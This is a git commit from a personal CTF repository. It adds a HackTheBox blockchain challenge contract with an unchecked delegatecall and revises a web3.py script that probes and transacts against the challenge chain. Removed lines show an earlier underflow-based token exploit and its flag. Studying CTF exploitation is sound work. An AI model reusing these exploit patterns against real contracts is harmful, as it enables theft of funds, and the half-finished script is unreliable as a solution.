4f93b8b1057025bd35f0d0871951a512a416c4e5
ShundaZhang <zhangshunda@gmail.com>
2023-08-13 22:02:30 +0800

    Solving portal noncense...seems no solustion...

---
+++ ctf/blockchain/blockchain_portal_noncense/Contract/src/Portal2.sol
@@ -0,0 +1,34 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+contract PortalStation {
+    
+    mapping(string => address) public destinations;
+    mapping(string => bool) public isPortalActive;
+    bool isExpertStandby;
+
+    constructor() {
+        destinations["orcKingdom"] = 0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007;
+        destinations["elfKingdom"] = 0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF;
+        destinations["dawrfKingdom"] = 0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1;
+        isPortalActive["elfKingdom"] = true;
+    }
+
+    function requestPortal(string calldata _destination) public payable {
+        require(destinations[_destination] != address(0));
+        require(isExpertStandby, "Portal expert has a day off");
+        require(msg.value > 1337 ether);
+
+        isPortalActive[_destination] = true;
+    }
+
+    function createPortal(string calldata _destination) public returns (bool, bytes memory) {
+        require(destinations[_destination] != address(0));
+        
+        (bool success, bytes memory retValue) = destinations[_destination].delegatecall(abi.encodeWithSignature("connect()"));
+        require(success, "Portal destination is currently not available");
+        //require(abi.decode(retValue, (bool)), "Connection failed");
+	return (success, retValue);
+    }
+
+}
--- ctf/blockchain/blockchain_portal_noncense/dec.py
+++ ctf/blockchain/blockchain_portal_noncense/dec.py
@@ -5,10 +5,10 @@ from solcx import compile_source, install_solc, compile_files
 from Crypto.Util.number import bytes_to_long
 
 x = {
-    "PrivateKey": "0xdc01c4b83349bd60ef37ccb0a191e8a14c40984a8e646214938b3308d82ab8ff",
-    "Address": "0x0a107Cda0C45B7004E0Dc22Db9E261ABA6668432",
-    "TargetAddress": "0x894CEFb5170871144C8Fa937D28634C8f7F837a9",
-    "setupAddress": "0x717E79714f22c378F78Fcdb307c5ED93F55f5f7B"
+    "PrivateKey": "0x2de3d450f2b9f28d5640560572511a56b1133ff1f39236fc40e51c6fb55e945c",
+    "Address": "0xaDb67e10Fa330db49e98201B4c5F19356CfA3f59",
+    "TargetAddress": "0xACef632826fb9d4EF70cB70640b5F56b7474B3a9",
+    "setupAddress": "0xfD730FDDbD5b98471b7a0fE78d2CB0Fd0E5454BA"
 }
 
 PrivateKey =    x["PrivateKey"]
@@ -17,11 +17,9 @@ TargetContract = x["TargetAddress"]
 SetupContract =  x["setupAddress"]
 
 #Attack Contract address
-Target2Contract = "0x2C55A80eB745e5b392b1D2e2d816f5839436e442"
-#SilverCoin address
-Target3Contract = "0xCc3a130d38849f67985A3E03eE98754B1Dd5aC67"
+Target2Contract = "0xB89EcCb84C7CA4D2d28ecb49617982D4FF4c8CcE"
 
-url = 'http://157.245.39.76:31736/rpc'
+url = 'http://157.245.37.125:30378/rpc'
 
 w3 = Web3(Web3.HTTPProvider(url))
 block_number = w3.eth.block_number
@@ -33,41 +31,52 @@ print(balance)
 block = w3.eth.get_block(block_number)
 
 #print(block)
+#print(w3.eth.get_code(TargetContract))
+#print(w3.eth.get_code("0xFC31cde4aCbF2b1d2996a2C7f695E850918e4007"))
+#print(w3.eth.get_code("0x598136Fd1B89AeaA9D6825086B6E4cF9ad2BD4cF"))
+#print(w3.eth.get_code("0xFc2D16b59Ec482FaF3A8B1ee6E7E4E8D45Ec8bf1"))
+
 
 account_from = {
         'private_key': PrivateKey,
         'address': account_address,
 }
 
-install_solc("0.7.0")
+install_solc("0.8.13")
 
+compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.8.13")
+abi = compiled['Contract.sol:Contract']['abi']
 
-# Check if the block exists
-if block is not None:
-    # Access block information
-    block_hash = block['hash']
-    block_timestamp = block['timestamp']
-    block_transactions = block['transactions']
+contract_instance = w3.eth.contract(address=Target2Contract, abi=abi)
+#number = contract_instance.functions.attack2().call()
+#print(number)
 
-    print(f"Block Number: {block_number}")
-    print(f"Block Hash: {block_hash}")
-    print(f"Block Timestamp: {block_timestamp}")
-    print(f"Block Transactions: {block_transactions}")
+#compiled = compile_files(["Portal.sol"], output_values=["abi"], solc_version="0.8.13")
+#abi = compiled['Portal.sol:PortalStation']['abi']
+compiled = compile_files(["Portal2.sol"], output_values=["abi"], solc_version="0.8.13")
+abi = compiled['Portal2.sol:PortalStation']['abi']
 
-    # Retrieve and print transaction details for each transaction in the block
-    # Log -> Address
-    for tx_hash in block_transactions:
-        tx = w3.eth.get_transaction_receipt(tx_hash)
-        if tx is not None:
-            print(tx)
+contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
 
-else:
-    print(f"Block {block_number} not found.")
+#number = contract_instance2.functions.destinations("orcKingdom").call()
+#print(number)
+#number = contract_instance2.functions.destinations("elfKingdom").call()
+#print(number)
+#number = contract_instance2.functions.destinations("dawrfKingdom").call()
+#print(number)
+#number = contract_instance2.functions.destinations("").call()
+#print(number)
 
-#exit(0)
-
+number = contract_instance2.functions.createPortal("orcKingdom").call()
+print(number)
+number = contract_instance2.functions.createPortal("elfKingdom").call()
+print(number)
+number = contract_instance2.functions.createPortal("dawrfKingdom").call()
+print(number)
 '''
-construct_txn = contract_instance3.functions.transfer(Address, 26_000_000).build_transaction(
+#construct_txn = contract_instance2.functions.createPortal("elfKingdom").build_transaction(
+construct_txn = contract_instance2.functions.createPortal("orcKingdom").build_transaction(
+#construct_txn = contract_instance2.functions.createPortal("dawrfKingdom").build_transaction(
 	{
 		'from': account_from['address'],
 		'nonce': w3.eth.get_transaction_count(account_from['address']),
@@ -85,71 +94,15 @@ tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private
 tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
 tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
-'''
 
-#Contract2 should not be neccessary, can merge to SilverCoin attack
-compiled = compile_files(["Contract.sol"], output_values=["abi"], solc_version="0.7.0")
-abi = compiled['Contract.sol:Contract']['abi']
-
-contract_instance2 = w3.eth.contract(address=Target2Contract, abi=abi)
-
-contract_instance2.functions.attack2().transact()
-print(contract_instance2.functions.balanceOf(Address).call())
-#print(contract_instance2.functions.balanceOf(TargetContract).call())
-#print(contract_instance2.functions.balanceOf(SetupContract).call())
-
-compiled = compile_files(["SilverCoin.sol"], output_values=["abi"], solc_version="0.7.0")
-abi = compiled['SilverCoin.sol:SilverCoin']['abi']
-
-contract_instance3 = w3.eth.contract(address=Target3Contract, abi=abi)
-
-#contract_instance3.functions.approve(TargetContract, 28_000_000).transact()  #.transact() will cause address(0) in SilverCoin..., have to use build_transaction
-#contract_instance3.functions.transfer(Address, 26_000_000).transact()
-
-construct_txn = contract_instance3.functions.approve(TargetContract, 26_000_000).build_transaction(
-#construct_txn = contract_instance3.functions.transfer(Address, 26_000_000).build_transaction(
+construct_txn = contract_instance2.functions.requestPortal("orcKingdom").build_transaction(
         {
                 'from': account_from['address'],
                 'nonce': w3.eth.get_transaction_count(account_from['address']),
                 #'from': Target2Address,
                 #'nonce': w3.eth.get_transaction_count(Target2Address),
                 'chainId': w3.eth.chain_id,
-                #'value' : 1
-                #"gasPrice": w3.to_wei(50, 'gwei'),
-                #"gas": 21000,
-                #"value": w3.to_wei("0", "ether"),
-        }
-)
-
-tx_create = w3.eth.account.sign_transaction(construct_txn, account_from['private_key'])
-tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
-tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
-print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
-
-number = contract_instance3.functions.balanceOf(Address).call()
-print(f'Balance of {Address}: {number}.')
-number = contract_instance3.functions.balanceOf(SetupContract).call()
-print(f'Balance of {SetupContract}: {number}.')
-number = contract_instance3.functions.allowance(Address, Address).call()
-print(f'allowance[{Address}][{TargetContract}] = {number}')
-
-#exit(0)
-
-
-compiled = compile_files(["Shop.sol"], output_values=["abi"], solc_version="0.7.0")
-abi = compiled['Shop.sol:Shop']['abi']
-
-contract_instance2 = w3.eth.contract(address=TargetContract, abi=abi)
-
-#construct_txn = contract_instance2.functions.buyItem(2).transact()
-construct_txn = contract_instance2.functions.buyItem(2).build_transaction(
-        {
-                'from': account_from['address'],
-                'nonce': w3.eth.get_transaction_count(account_from['address']),
-                #'from': Target2Address,
-                #'nonce': w3.eth.get_transaction_count(Target2Address),
-                'chainId': w3.eth.chain_id,
-                #'value' : 1
+                'value' : 1338,
                 #"gasPrice": w3.to_wei(50, 'gwei'),
                 #"gas": 21000,
                 #"value": w3.to_wei("0", "ether"),
@@ -160,16 +113,16 @@ tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
 tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
 print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
 
-compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.7.0")
+compiled = compile_files(["Setup.sol"], output_values=["abi"], solc_version="0.8.13")
 abi = compiled['Setup.sol:Setup']['abi']
 
 contract_instance = w3.eth.contract(address=SetupContract, abi=abi)
-number = contract_instance.functions.isSolved(account_address).call()
-#number = contract_instance.functions.isSolved(Target2Contract).call()
+number = contract_instance.functions.isSolved().call()
 
 print(f'The current number stored is: { number } ')
-#HTB{und32f10w_70_937_7h3_k3y}
+#
 
+'''
 
 '''
 https://ctftime.org/writeup/31583
